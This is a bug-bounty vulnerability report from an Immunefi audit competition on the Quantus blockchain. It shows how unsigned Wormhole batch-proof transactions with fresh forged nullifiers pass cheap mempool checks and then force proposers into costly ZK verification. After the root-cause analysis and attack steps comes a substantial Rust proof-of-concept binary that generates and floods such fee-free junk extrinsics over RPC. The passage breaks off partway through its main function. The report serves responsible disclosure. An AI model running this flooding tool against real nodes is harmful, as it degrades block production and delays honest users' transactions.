# 90398 bc high an unauthenticated attacker will force processing nodes to process unsigned wormhole mempool transactions beyond configured proposer limits&#x20;

**Submitted on Aug 24th 2026 at 20:35:28 UTC by @n3310y for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #90398
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

## Description

## Brief/Intro

Cheap, verify-free `validate_unsigned()` admission for Wormhole batch proofs will cause the proposer to process candidate bytes and verification work beyond the block-size, block-weight, and skip-cap limits that should have bounded proposer processing, as an unauthenticated attacker submits canonical proof variants with fresh nullifiers that enter the mempool with `Pays::No` and are rejected only after `pre_dispatch()` runs the full ZK verifier.

## Vulnerability Details

### Root Cause

In [`pallets/wormhole/src/lib.rs:1006-1043`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/wormhole/src/lib.rs#L1006-L1043) `validate_unsigned()` admits `verify_public_batch` / `verify_private_batch` after `pre_validate_*_batch_proof()` only. That function deserializes the proof, checks canonical encoding, parses public inputs, and rejects used or duplicate nullifiers. It never calls `verifier.verify()`. The admitted transaction has fixed priority `UNSIGNED_EXIT_PRIORITY = 1`, longevity 5, `propagate(true)`, and a `provides` tag from `exit_bundle_provides_tag()`, which hashes attacker-controlled nullifiers.

In [`pallets/wormhole/src/lib.rs:1045-1062`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/wormhole/src/lib.rs#L1045-L1062) `pre_dispatch()` is the first place that runs `validate_*_batch_proof()`, which calls the embedded verifier at lines 1167-1179 (private) or 1226-1238 (public). The choice to defer ZK verification to proposer-time `pre_dispatch()` while tagging pool entries by unverified nullifiers is the mistake: fresh nullifiers make each junk proof a distinct ready transaction, so the proposer pays full verification for fee-free unsigned traffic.

### Details

Wormhole settlement is submitted as an unsigned extrinsic. `author_submitExtrinsic` puts the candidate in the transaction pool. The runtime validates it through `Executive::validate_transaction()`, which calls `Wormhole::validate_unsigned()`. The QPoW node constructs the proposer with that same pool (`node/src/service.rs:464-471`) and starts mining with a 10-second build window (`node/src/service.rs:486-499`). Basic Authorship then iterates ready transactions and `push()`es each one. `push()` applies the extrinsic, which runs `Wormhole::pre_dispatch()`.

Pool admission is deliberately cheap:

```rust
fn validate_unsigned(_source: TransactionSource, call: &Self::Call) -> TransactionValidity {
    // Pool admission runs on every gossiped transaction, so it deliberately performs
    // only the cheap pre-validation ... and NOT the expensive ZK verification.
    match call {
        Call::verify_public_batch { proof_bytes } => {
            let (_, _, bundle, _validity) =
                Self::pre_validate_public_batch_proof(proof_bytes) // @audit: deserialize, canonical encoding, bundle/nullifier checks only. No verifier.verify().
                    .map_err(|_| InvalidTransaction::Call)?;

            ValidTransaction::with_tag_prefix("WormholePublicBatch")
                .and_provides(Self::exit_bundle_provides_tag(&bundle)) // @audit: tag is a hash of public-input nullifiers. Attacker chooses those nullifiers.
                .priority(crate::UNSIGNED_EXIT_PRIORITY) // @audit: constant 1. No fee, no signed origin.
                .longevity(5)
                .propagate(true)
                .build()
        },
        // verify_private_batch is the same cheap path
        _ => InvalidTransaction::Call.into(),
    }
}
```

`pre_validate_public_batch_proof()` is the guard the design relies on. It bounds proof size, deserializes with the embedded circuit, requires `proof.to_bytes() == proof_bytes`, parses public inputs, and runs `validate_exit_bundle_common()` (asset, fee bps, live block hash/number, unused/non-duplicate nullifiers). Those checks do not bind the nullifiers to a valid proof. A canonical fixture with rewritten live block metadata and unique nonzero nullifiers therefore returns `ValidTransaction`.

The intended throttle is the `provides` tag:

```rust
fn exit_bundle_provides_tag(bundle: &ExitBundle) -> [u8; 32] {
    let mut preimage = Vec::new();
    for segment in &bundle.segments {
        for nullifier in &segment.nullifiers {
            preimage.extend_from_slice(nullifier.as_ref()); // @audit: nullifiers are still unverified public inputs here.
        }
    }
    sp_io::hashing::blake2_256(&preimage)
}
```

That tag stops resubmitting the same logical exit under a mutated encoding. It does not stop a new logical exit. Each fresh nullifier set is a new tag, so the pool can hold one junk candidate per nullifier tuple, up to the 256 MiB / 36,772 entry pool.

Inclusion is where the cost is paid:

```rust
fn pre_dispatch(call: &Self::Call) -> Result<(), TransactionValidityError> {
    // Block-inclusion gate. ... this runs the FULL validation including ZK verification
    match call {
        Call::verify_public_batch { proof_bytes } =>
            Self::validate_public_batch_proof(proof_bytes) // @audit: cheap checks again, then verifier.verify().
                .map(|_| ())
                .map_err(|_| InvalidTransaction::Call.into()),
        _ => Err(InvalidTransaction::Call.into()),
    }
}

fn validate_public_batch_proof(proof_bytes: &[u8]) -> Result<(ExitBundle, Vec<bool>), Error<T>> {
    let (verifier, proof, bundle, validity) =
        Self::pre_validate_public_batch_proof(proof_bytes)?;
    verifier.verify(proof).map_err(|e| { // @audit: first cryptographic authentication. Runs in the proposer, not at pool admission.
        log::error!("Public-batch proof verification failed: {:?}", e);
        Error::<T>::ProofVerificationFailed
    })?;
    Ok((bundle, validity))
}
```

Basic Authorship (`sc-basic-authorship 0.53.0`) is the consumer. Before `push()` it checks `block_size + tx_size > DEFAULT_BLOCK_SIZE_LIMIT` (4,194,816 bytes). After a failed `pre_dispatch()` the candidate is **not** added to the block, so block size and `RuntimeBlockWeights` never move. The final block itself does not exceed the block-size limit because the invalid transactions are not included. The invalid branch reports the transaction invalid and continues. `MAX_SKIPPED_TRANSACTIONS = 8` applies only to overweight/oversize results, not to `InvalidTransaction::Call`. The proposer therefore keeps verifying 223,627-byte unsigned proofs until the ready iterator is empty or the 9-second hard deadline fires: it processes candidate bytes and verification work beyond the limits that should have bounded proposer processing.

Configured limits used in the PoC (production values, not invented). They bound included extrinsics, not failed `pre_dispatch()` work:

The proposer size cap is 4,194,816 bytes, so at most 18 included public-batch extrinsics of this shape would fit. Normal-class length (75% of 5 MiB) allows 17. Normal-class ref\_time is 4.5 s and max-block ref\_time is 6.0 s; one public-batch ZK verify is weighted at 21.077 ms, so 214 such verifies would exhaust normal weight if they were charged. They are not charged, because they die in `pre_dispatch()`. The PoC shows one proposal processing 500 of them.

A duplicate-nullifier variant is rejected at `author_submitExtrinsic` with `Invalid Transaction`, which shows the cheap guard is live and only fails to cover unique unverified nullifiers.

### Attack Path

{% stepper %}
{% step %}

## Read a canonical fixture

An unauthenticated RPC client reads a canonical public-batch fixture from `pallets/wormhole/test-data/public_batch.hex`. No valid exit, key, or balance is required.
{% endstep %}

{% step %}

## Update live block metadata

The client reads `chain_getHeader` / `chain_getBlockHash` and writes the live block hash and number into the proof public inputs.
{% endstep %}

{% step %}

## Generate unique nullifiers

The client replaces every nullifier with unique nonzero field limbs and reserializes with the production `ProofWithPublicInputs::to_bytes()`.
{% endstep %}

{% step %}

## Submit an unsigned extrinsic

The client submits a bare unsigned `Wormhole::verify_public_batch` extrinsic through `author_submitExtrinsic()`. `validate_unsigned()` accepts it and the pool stores a unique nullifier tag.
{% endstep %}

{% step %}

## Fill and refill the ready pool

The client repeats with new nullifiers until a wave fills the ready pool, then refills after the proposer drops invalid entries. No fee is charged.
{% endstep %}

{% step %}

## Force proposer-side verification

The production QPoW proposer iterates the ready pool, `push()`es each candidate, runs `pre_dispatch()` / `verifier.verify()`, logs `Public-batch proof verification failed`, and continues.
{% endstep %}

{% step %}

## Observe the impact

The observer records pool occupancy, verifier-failure count, processed candidate bytes and verification work versus the limits that should have bounded proposer processing, proposer wall-clock, CPU, and honest-transfer inclusion delay.
{% endstep %}
{% endstepper %}

## Impact Details

The processing node suffers unpriced proposer-time ZK verification: the proposer processes candidate bytes and verification work beyond the block-size, block-weight, and skip-cap limits that should have bounded proposer processing. The attacker pays no fee and needs no Dilithium key or balance.

On the measured private `--dev` run, 1,501 unsigned candidates were accepted and 1,501 full verifier failures were logged. One proposal processed 500 invalid proofs (111,813,500 candidate bytes, 10.538 s of configured ZK ref\_time) in 2,951 ms. The final block itself does not exceed the 4,194,816-byte block-size limit, because those invalid transactions are not included. The proposer nevertheless processed candidate bytes and verification work 26.66× that size limit and 27.78× the 18-extrinsic inclusion cap that should have bounded proposer processing. The skip cap of 8 was not applied. An honest `transfer_keep_alive` submitted while the pool was occupied took 6,950 ms to include versus 2,660 ms in steady state. Sampled attack hashes were not included in any block. Node CPU peaked at 245.3% during the flood versus \~72–99% while only mining.

The attacker gains no funds. The node does not halt: blocks continued and recovery still produced a block. This run did not hit the 9-second `HitDeadline` because native verification drained a 500-candidate wave in about 3 seconds. It also does not demonstrate a 24-hour 30% resource increase, theft, or freezing of funds.

Dashboard impact: High — causing network processing nodes to process transactions from the mempool beyond set parameters. The program text for that impact specifically names custom unsigned Wormhole `validate_unsigned` / `Pays::No` / pool `provides` tags.

### Risk Breakdown

Severity is High under the project-specific High #2 impact (mempool processing beyond set parameters). Under the generic Immunefi table this family is often Medium DoS; the program's own impact list is the one to select on the dashboard.

Exploitability is moderate. The attacker needs only loopback or RPC access and the committed fixture. There is no privileged role, no signature, and no balance requirement. The attacker must keep public inputs synchronized with the live block hash/number and use unique nullifiers.

Repeatability is high. Four refill waves produced 1,501 accepted candidates and three \~3-second proposals each processing \~500 invalid proofs.

Likelihood is high on any node that accepts unsigned Wormhole extrinsics into the ready pool, which is the production `quantus-node` path.

This is not known issues #1 (referendum votes), #2 (miner plaintext), or #3 (zk-tree depth). It is not ML-DSA verification inside `UncheckedExtrinsic::check()`: the PoC submits a bare unsigned Wormhole call and never verifies a Dilithium signature.

## References

* <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/wormhole/src/lib.rs#L1006-L1062>
* <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/wormhole/src/lib.rs#L1116-L1255>
* <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/node/src/service.rs#L464-L499>
* <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs>
* <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/cli/src/params/transaction\\_pool\\_params.rs#L42-L55>
* <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/wormhole/src/weights.rs#L74-L78>
* Target revision: `3b243b870a5442a6e5f443056f67bbba87d472f5`

## Proof of Concept

Standalone attacker binary against a private `quantus-node --dev` over loopback RPC. It does not mock `validate_unsigned()`, patch the runtime, or write node storage. It submits bare unsigned `Wormhole::verify_public_batch` extrinsics via `author_submitExtrinsic`. The production QPoW proposer / Basic Authorship consume them.

{% hint style="warning" %}
Private disposable node only. Do not point this at a public network.
{% endhint %}

### Prerequisites

Git, a Rust toolchain that can build this repo, `clang`/`libclang`, free ports `19945`/`30345`/`19616`, fixture `pallets/wormhole/test-data/public_batch.hex`. Work from the chain crate root. `--rpc-methods Unsafe` is required. macOS: `export LIBCLANG_PATH=/opt/homebrew/opt/llvm@21/lib`. Set `NODE_LOG_PATH` before the harness starts (the runner does this).

### Files to add

Do not modify `pallets/wormhole` or the runtime. Add two files from the following sections, then insert these PoC-only deps in `node/Cargo.toml` `[dependencies]`:

```toml
pallet-wormhole = { workspace = true, default-features = true }
qp-plonky2-verifier = { workspace = true, default-features = true }
qp-wormhole-verifier = { workspace = true, default-features = true }
```

Place `pallet-wormhole` next to the other `pallet-*` entries, and the two verifier crates next to the other `qp-*` entries. After the edit the relevant region looks like:

```toml
pallet-utility.default-features = true
pallet-utility.workspace = true
pallet-wormhole = { workspace = true, default-features = true }
pallet-zk-tree.default-features = true
pallet-zk-tree.workspace = true
prometheus.workspace = true
qp-dilithium-crypto = { workspace = true }
qp-plonky2-verifier = { workspace = true, default-features = true }
qp-rusty-crystals-dilithium.workspace = true
qp-rusty-crystals-hdwallet.workspace = true
qp-wormhole.workspace = true
qp-wormhole-verifier = { workspace = true, default-features = true }
```

`cargo build` will update `Cargo.lock` to record `quantus-node` now depending on `pallet-wormhole`, `qp-plonky2-verifier`, and `qp-wormhole-verifier`. Allow that lockfile update. Do not hand-edit `Cargo.lock`.

Do **not** add these crates to the node `std` / `runtime-benchmarks` / `try-runtime` feature lists. Do **not** change `pallets/wormhole`, the runtime, or QPoW. Do **not** replace the fixture.

### Full PoC source

#### `node/src/bin/wormhole_proposer_e2e.rs`

Paste this file exactly.

```rust
//! Private-node Wormhole proposer PoC. Do not point at a public network.

#![allow(clippy::expect_used, clippy::panic, clippy::unwrap_used)]

use codec::Encode;
use qp_dilithium_crypto::Dilithium87Pair;
use qp_plonky2_verifier::field::types::Field;
use qp_wormhole_verifier::{C, D, F, ProofWithPublicInputs};
use quantus_runtime::{
	transaction_extensions::{ReversibleTransactionExtension, WormholeProofRecorderExtension},
	Address, BalancesCall as RuntimeBalancesCall, Runtime, RuntimeCall, Signature, SignedPayload,
	TxExtension, UncheckedExtrinsic, VERSION,
};
use serde_json::{json, Value};
use sp_core::{crypto::AccountId32, H256, Pair};
use sp_runtime::{
	generic::Era,
	traits::{Hash as _, IdentifyAccount},
	MultiAddress,
};
use std::{
	fs,
	io::{Read, Write},
	net::{TcpStream, ToSocketAddrs},
	path::{Path, PathBuf},
	process::Command,
	sync::{
		atomic::{AtomicBool, AtomicU64, Ordering},
		Arc, Mutex,
	},
	thread,
	time::{Duration, Instant, SystemTime, UNIX_EPOCH},
};

const UNIT: u128 = 1_000_000_000_000;
const DEFAULT_VARIANTS: usize = 500;
const DEFAULT_ATTACK_SECONDS: u64 = 24;
const DEFAULT_REFILL_INTERVAL_SECONDS: u64 = 8;
const DEFAULT_THREADS: usize = 16;
const GOLDILOCKS_ORDER: u64 = 0xFFFFFFFF00000001;

const QPOW_BUILD_TIME_SECS: u64 = 10;
const PROPOSER_HARD_DEADLINE_MS: u64 = 9_000;
const PROPOSER_BLOCK_SIZE_LIMIT: usize = 4 * 1024 * 1024 + 512;
const RUNTIME_MAX_BLOCK_LENGTH: usize = 5 * 1024 * 1024;
const NORMAL_DISPATCH_PERCENT: u64 = 75;
const WEIGHT_REF_TIME_PER_SECOND: u64 = 1_000_000_000_000;
const RUNTIME_MAX_BLOCK_REF_TIME: u64 = 6 * WEIGHT_REF_TIME_PER_SECOND;
const PUBLIC_BATCH_ZK_VERIFY_REF_TIME_PS: u64 = 21_077_000_000;
const PRIVATE_BATCH_ZK_VERIFY_REF_TIME_PS: u64 = 15_162_000_000;
const POOL_LIMIT: usize = 36_772;
const POOL_KBYTES: usize = 262_144;
const MAX_SKIPPED_TRANSACTIONS: usize = 8;
const UNSIGNED_EXIT_PRIORITY: u64 = 1;

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
enum Mode {
	Private,
	Public,
}

impl Mode {
	fn parse(value: &str) -> Self {
		match value {
			"private" => Self::Private,
			"public" => Self::Public,
			other => panic!("mode must be private or public, got {other}"),
		}
	}

	fn call(&self, proof_bytes: Vec<u8>) -> RuntimeCall {
		match self {
			Self::Private =>
				pallet_wormhole::Call::<Runtime>::verify_private_batch { proof_bytes }.into(),
			Self::Public =>
				pallet_wormhole::Call::<Runtime>::verify_public_batch { proof_bytes }.into(),
		}
	}

	fn label(&self) -> &'static str {
		match self {
			Self::Private => "private",
			Self::Public => "public",
		}
	}

	fn zk_ref_time_ps(&self) -> u64 {
		match self {
			Self::Private => PRIVATE_BATCH_ZK_VERIFY_REF_TIME_PS,
			Self::Public => PUBLIC_BATCH_ZK_VERIFY_REF_TIME_PS,
		}
	}

	fn reject_log(&self) -> &'static str {
		match self {
			Self::Private => "Private-batch proof verification failed",
			Self::Public => "Public-batch proof verification failed",
		}
	}
}

#[derive(Clone)]
struct Rpc {
	host: String,
	port: u16,
}

impl Rpc {
	fn from_url(url: &str) -> Self {
		let authority = url
			.strip_prefix("http://")
			.expect("RPC URL must use http://")
			.trim_end_matches('/');
		let mut parts = authority.splitn(2, ':');
		let host = parts.next().expect("RPC host").to_string();
		let port = parts.next().unwrap_or("9944").parse().expect("RPC port");
		Self { host, port }
	}

	fn request(&self, method: &str, params: Value, read_timeout: Duration) -> Result<Value, String> {
		let body = json!({
			"jsonrpc": "2.0",
			"id": 1,
			"method": method,
			"params": params,
		})
		.to_string();
		let addr = format!("{}:{}", self.host, self.port)
			.to_socket_addrs()
			.map_err(|e| e.to_string())?
			.next()
			.ok_or_else(|| "RPC address did not resolve".to_string())?;
		let mut stream = TcpStream::connect_timeout(&addr, Duration::from_secs(5))
			.map_err(|e| format!("connect: {e}"))?;
		stream.set_read_timeout(Some(read_timeout)).map_err(|e| e.to_string())?;
		stream.set_write_timeout(Some(Duration::from_secs(10))).map_err(|e| e.to_string())?;
		let request = format!(
			"POST / HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
			self.host,
			body.len(),
			body
		);
		stream.write_all(request.as_bytes()).map_err(|e| format!("write: {e}"))?;
		let mut response = Vec::new();
		stream.read_to_end(&mut response).map_err(|e| format!("read: {e}"))?;
		let response = String::from_utf8_lossy(&response);
		let body = response
			.split_once("\r\n\r\n")
			.map(|(_, body)| body)
			.ok_or_else(|| format!("malformed HTTP response: {response}"))?;
		let value: Value =
			serde_json::from_str(body).map_err(|e| format!("JSON: {e}; body={body}"))?;
		if let Some(error) = value.get("error") {
			return Err(error.to_string());
		}
		value
			.get("result")
			.cloned()
			.ok_or_else(|| format!("RPC response has no result: {value}"))
	}

	fn call(&self, method: &str, params: Value) -> Result<Value, String> {
		self.request(method, params, Duration::from_secs(45))
	}
}

fn hex_bytes(bytes: &[u8]) -> String {
	format!("0x{}", hex::encode(bytes))
}

fn parse_h256(value: &Value) -> H256 {
	let encoded = value.as_str().expect("RPC hash string");
	let bytes = hex::decode(encoded.trim_start_matches("0x")).expect("RPC hash hex");
	H256::from_slice(&bytes)
}

fn parse_number(value: &Value) -> u64 {
	u64::from_str_radix(
		value.as_str().expect("RPC block number string").trim_start_matches("0x"),
		16,
	)
	.expect("RPC block number")
}

fn best(rpc: &Rpc) -> (u64, H256) {
	let header = rpc.call("chain_getHeader", json!([])).expect("chain_getHeader");
	let number = parse_number(header.get("number").expect("header number"));
	let hash = parse_h256(
		&rpc.call("chain_getBlockHash", json!([number])).expect("chain_getBlockHash"),
	);
	(number, hash)
}

fn genesis_hash(rpc: &Rpc) -> H256 {
	parse_h256(&rpc.call("chain_getBlockHash", json!([0])).expect("genesis hash"))
}

fn submit(rpc: &Rpc, extrinsic: &[u8]) -> Result<String, String> {
	rpc.call("author_submitExtrinsic", json!([hex_bytes(extrinsic)]))
		.map(|value| value.as_str().unwrap_or_default().to_string())
}

#[derive(Clone, Debug)]
enum PoolOccupancy {
	Count(usize),
	RpcError(String),
}

fn pool_occupancy(rpc: &Rpc) -> PoolOccupancy {
	match rpc.call("author_pendingExtrinsics", json!([])) {
		Ok(value) => PoolOccupancy::Count(value.as_array().map(Vec::len).unwrap_or(0)),
		Err(error) => PoolOccupancy::RpcError(error),
	}
}

fn occupancy_busy(occupancy: &PoolOccupancy, min_count: usize) -> bool {
	match occupancy {
		PoolOccupancy::Count(count) => *count >= min_count,
		PoolOccupancy::RpcError(error) =>
			error.to_lowercase().contains("memory") || error.to_lowercase().contains("capacity"),
	}
}

fn account(pair: &Dilithium87Pair) -> AccountId32 {
	pair.public().into_account()
}

fn account_hex(pair: &Dilithium87Pair) -> String {
	hex_bytes(account(pair).as_ref())
}

fn json_u128(value: &Value) -> Option<u128> {
	if let Some(n) = value.as_u64() {
		return Some(n as u128);
	}
	if let Some(s) = value.as_str() {
		return s.parse().ok();
	}
	value.as_number().and_then(|n| n.to_string().parse().ok())
}

fn alice_free_balance(rpc: &Rpc) -> Option<u128> {
	let alice = Dilithium87Pair::from_seed_slice(&[0u8; 32]).ok()?;
	let key = hex_bytes(account(&alice).as_ref());
	let value = rpc.call("system_account", json!([key])).ok()?;
	value.get("data").and_then(|data| data.get("free")).and_then(json_u128)
}

fn extension(nonce: u32, best_block: u64) -> TxExtension {
	let period = quantus_runtime::configs::BlockHashCount::get()
		.checked_next_power_of_two()
		.map(|count| count / 2)
		.unwrap_or(2) as u64;
	(
		frame_system::CheckNonZeroSender::<Runtime>::new(),
		frame_system::CheckSpecVersion::<Runtime>::new(),
		frame_system::CheckTxVersion::<Runtime>::new(),
		frame_system::CheckGenesis::<Runtime>::new(),
		frame_system::CheckEra::<Runtime>::from(Era::mortal(period, best_block)),
		frame_system::CheckNonce::<Runtime>::from(nonce),
		frame_system::CheckWeight::<Runtime>::new(),
		ReversibleTransactionExtension::<Runtime>::new(),
		WormholeProofRecorderExtension::<Runtime>::new(),
		pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(0),
		frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
		frame_system::WeightReclaim::<Runtime>::new(),
	)
}

fn signed_payload(
	call: RuntimeCall,
	ext: TxExtension,
	genesis: H256,
	best_hash: H256,
) -> SignedPayload {
	SignedPayload::from_raw(
		call,
		ext,
		(
			(),
			VERSION.spec_version,
			VERSION.transaction_version,
			genesis,
			best_hash,
			(),
			(),
			(),
			(),
			(),
			None,
			(),
		),
	)
}

fn signed_transfer(genesis: H256, best_block: u64, best_hash: H256, nonce: u32) -> Vec<u8> {
	let alice = Dilithium87Pair::from_seed_slice(&[0u8; 32]).expect("Alice seed");
	let bob = Dilithium87Pair::from_seed_slice(&[1u8; 32]).expect("Bob seed");
	let call: RuntimeCall = RuntimeBalancesCall::transfer_keep_alive {
		dest: MultiAddress::Id(account(&bob)),
		value: UNIT,
	}
	.into();
	let ext = extension(nonce, best_block);
	let payload = signed_payload(call.clone(), ext.clone(), genesis, best_hash);
	let signature = payload.using_encoded(|bytes| alice.sign(bytes));
	UncheckedExtrinsic::new_signed(
		call,
		Address::Id(account(&alice)),
		Signature::Dilithium87(signature),
		ext,
	)
	.encode()
}

fn proof_from_fixture(mode: Mode, fixture: &[u8]) -> ProofWithPublicInputs<F, C, D> {
	let verifier = match mode {
		Mode::Private => pallet_wormhole::get_private_batch_verifier()
			.expect("private-batch verifier is embedded in this build"),
		Mode::Public => pallet_wormhole::get_public_batch_verifier()
			.expect("public-batch verifier is embedded in this build"),
	};
	ProofWithPublicInputs::<F, C, D>::from_bytes(fixture.to_vec(), &verifier.circuit_data.common)
		.expect("fixture must deserialize with the production verifier")
}

fn set_field(proof: &mut ProofWithPublicInputs<F, C, D>, index: usize, value: u64) {
	proof.public_inputs[index] = F::from_canonical_u64(value);
}

fn set_digest(proof: &mut ProofWithPublicInputs<F, C, D>, start: usize, digest: H256) {
	for (i, chunk) in digest.as_bytes().chunks_exact(8).enumerate() {
		let value = u64::from_le_bytes(chunk.try_into().expect("digest chunk"));
		assert!(
			value < GOLDILOCKS_ORDER,
			"current block hash is not field-canonical at limb {i}: {value:#x}"
		);
		set_field(proof, start + i, value);
	}
}

fn mutate_public_inputs(
	mode: Mode,
	base: &ProofWithPublicInputs<F, C, D>,
	best_block: u64,
	best_hash: H256,
	variant_id: u64,
	duplicate_nullifiers: bool,
) -> Vec<u8> {
	let mut proof = base.clone();
	let leaves = pallet_wormhole::circuit_config::NUM_LEAF_PROOFS;
	match mode {
		Mode::Private => {
			set_digest(&mut proof, 3, best_hash);
			set_field(&mut proof, 7, best_block);
			let nullifier_start = 8 + leaves * 2 * 5;
			for leaf in 0..leaves {
				let first_limb = if duplicate_nullifiers {
					0x1000
				} else {
					0x1000 + variant_id * 1024 + leaf as u64 + 1
				};
				set_field(&mut proof, nullifier_start + leaf * 4, first_limb);
				for limb in 1..4 {
					set_field(&mut proof, nullifier_start + leaf * 4 + limb, 0);
				}
			}
		},
		Mode::Public => {
			let inner = pallet_wormhole::circuit_config::NUM_PRIVATE_BATCH_PROOFS;
			let nullifier_count = inner * leaves;
			set_digest(&mut proof, 6, best_hash);
			set_field(&mut proof, 10, best_block);
			let nullifier_start = 12 + (inner * leaves * 2) * 5;
			for leaf in 0..nullifier_count {
				let first_limb = if duplicate_nullifiers {
					0x2000
				} else {
					0x2000 + variant_id * 1024 + leaf as u64 + 1
				};
				set_field(&mut proof, nullifier_start + leaf * 4, first_limb);
				for limb in 1..4 {
					set_field(&mut proof, nullifier_start + leaf * 4 + limb, 0);
				}
			}
		},
	}
	proof.to_bytes()
}

fn bare_extrinsic(mode: Mode, proof_bytes: Vec<u8>) -> Vec<u8> {
	UncheckedExtrinsic::new_bare(mode.call(proof_bytes)).encode()
}

fn tx_hash(extrinsic: &[u8]) -> H256 {
	sp_runtime::traits::BlakeTwo256::hash(extrinsic)
}

fn in_block(rpc: &Rpc, wanted: &str, number: u64) -> Option<(u64, usize)> {
	let block_hash = parse_h256(&rpc.call("chain_getBlockHash", json!([number])).ok()?);
	let block = rpc.call("chain_getBlock", json!([hex_bytes(block_hash.as_bytes())])).ok()?;
	let extrinsics = block.get("block")?.get("extrinsics")?.as_array()?;
	for (index, encoded) in extrinsics.iter().enumerate() {
		let bytes = hex::decode(encoded.as_str()?.trim_start_matches("0x")).ok()?;
		if hex_bytes(tx_hash(&bytes).as_bytes()) == wanted {
			return Some((number, index));
		}
	}
	None
}

fn wait_for_inclusion(rpc: &Rpc, hash: &str, timeout: Duration) -> Option<(u64, usize, Duration)> {
	let started = Instant::now();
	let mut last_checked = 0u64;
	while started.elapsed() < timeout {
		let (number, _) = best(rpc);
		for n in last_checked..=number {
			if let Some((block, index)) = in_block(rpc, hash, n) {
				return Some((block, index, started.elapsed()));
			}
		}
		last_checked = number.saturating_add(1);
		thread::sleep(Duration::from_millis(200));
	}
	None
}

fn block_samples(rpc: &Rpc, duration: Duration) -> Vec<(f64, u64)> {
	let started = Instant::now();
	let mut samples = Vec::new();
	let mut previous = None;
	while started.elapsed() < duration {
		let (block, _) = best(rpc);
		if previous != Some(block) {
			samples.push((started.elapsed().as_secs_f64(), block));
			previous = Some(block);
		}
		thread::sleep(Duration::from_millis(250));
	}
	samples
}

fn now_ms() -> u128 {
	SystemTime::now().duration_since(UNIX_EPOCH).expect("system clock").as_millis()
}

fn sample_cpu(pid: u32) -> Option<f32> {
	let output = Command::new("ps").args(["-p", &pid.to_string(), "-o", "%cpu="]).output().ok()?;
	String::from_utf8_lossy(&output.stdout).trim().parse().ok()
}

fn print_occupancy(label: &str, occupancy: &PoolOccupancy) {
	match occupancy {
		PoolOccupancy::Count(count) => println!("{label}_PENDING_COUNT={count}"),
		PoolOccupancy::RpcError(error) => println!("{label}_PENDING_RPC_ERROR={error}"),
	}
}

#[derive(Debug, Clone)]
struct ProposalSample {
	height: u64,
	took_ms: u64,
	end_reason: String,
	extrinsics: u64,
	verifier_failures: usize,
}

fn parse_node_log(path: &Path, start_offset: u64, mode: Mode) -> (Vec<ProposalSample>, usize, usize) {
	let Ok(raw) = fs::read_to_string(path) else {
		return (Vec::new(), 0, 0);
	};
	let sliced = if (start_offset as usize) < raw.len() {
		&raw[start_offset as usize..]
	} else {
		&raw
	};
	let reject = mode.reject_log();
	let mut proposals = Vec::new();
	let mut pending_failures = 0usize;
	let mut total_failures = 0usize;
	let mut invalid_tx_logs = 0usize;
	for line in sliced.lines() {
		if line.contains(reject) {
			pending_failures += 1;
			total_failures += 1;
		}
		if line.contains("Invalid transaction:") {
			invalid_tx_logs += 1;
		}
		if let Some(rest) = line.split("Prepared block for proposing at ").nth(1) {
			let height = rest.split_whitespace().next().and_then(|s| s.parse().ok()).unwrap_or(0);
			let took_ms = rest
				.split('(')
				.nth(1)
				.and_then(|s| s.split(" ms").next())
				.and_then(|s| s.parse().ok())
				.unwrap_or(0);
			let end_reason = rest
				.split("end: ")
				.nth(1)
				.and_then(|s| s.split(';').next())
				.unwrap_or("unknown")
				.trim()
				.to_string();
			let extrinsics = rest
				.split("extrinsics_count: ")
				.nth(1)
				.and_then(|s| s.split_whitespace().next())
				.and_then(|s| s.parse().ok())
				.unwrap_or(0);
			proposals.push(ProposalSample {
				height,
				took_ms,
				end_reason,
				extrinsics,
				verifier_failures: pending_failures,
			});
			pending_failures = 0;
		}
	}
	if pending_failures > 0 {
		proposals.push(ProposalSample {
			height: 0,
			took_ms: 0,
			end_reason: "unassigned_after_last_proposal".into(),
			extrinsics: 0,
			verifier_failures: pending_failures,
		});
	}
	(proposals, total_failures, invalid_tx_logs)
}

fn submit_and_observe(
	rpc: &Rpc,
	genesis: H256,
	nonce: u32,
	label: &str,
	timeout: Duration,
) -> (u64, Option<(u64, usize, Duration)>) {
	let (submit_block, submit_hash) = best(rpc);
	let tx = signed_transfer(genesis, submit_block, submit_hash, nonce);
	let started = Instant::now();
	let result = submit(rpc, &tx);
	println!("{label}_SUBMIT_RESULT={result:?}");
	println!("{label}_TX_BYTES={}", tx.len());
	println!("{label}_SUBMIT_BLOCK={submit_block}");
	println!("{label}_SUBMIT_RPC_MS={}", started.elapsed().as_millis());
	let inclusion = result.ok().and_then(|hash| {
		println!("{label}_TX_HASH={hash}");
		wait_for_inclusion(rpc, &hash, timeout)
	});
	println!("{label}_INCLUSION={inclusion:?}");
	if let Some((block, _, elapsed)) = inclusion {
		println!("{label}_DELAY_BLOCKS={}", block.saturating_sub(submit_block));
		println!("{label}_DELAY_MS={}", elapsed.as_millis());
	} else {
		println!("{label}_DELAY_BLOCKS=none");
		println!("{label}_DELAY_MS=none");
	}
	(submit_block, inclusion)
}

pub fn main() {
	let mut args = std::env::args().skip(1);
	let rpc = Rpc::from_url(&args.next().unwrap_or_else(|| "http://127.0.0.1:19945".into()));
